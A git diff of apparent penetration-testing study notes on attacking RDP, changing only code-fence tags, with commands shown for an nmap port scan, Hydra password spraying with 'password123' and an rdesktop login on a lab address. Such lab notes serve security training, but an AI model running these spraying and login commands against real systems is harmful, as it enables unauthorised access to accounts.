@@ -1,7 +1,7 @@
 # Attacking RDP
 ## Enumeration
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ nmap -Pn -p3389 192.168.2.143 
 ```
 
@@ -10,13 +10,13 @@ Since RDP takes user credentials for authentication, one common attack vector ag
 
 **Hydra - RDP Password Spraying:** the password password123 will be tested against a list of usernames in the usernames.txt file. 
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 ```
 
 **RDP Login**
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ rdesktop -u admin -p password123 192.168.2.143
 ```
 
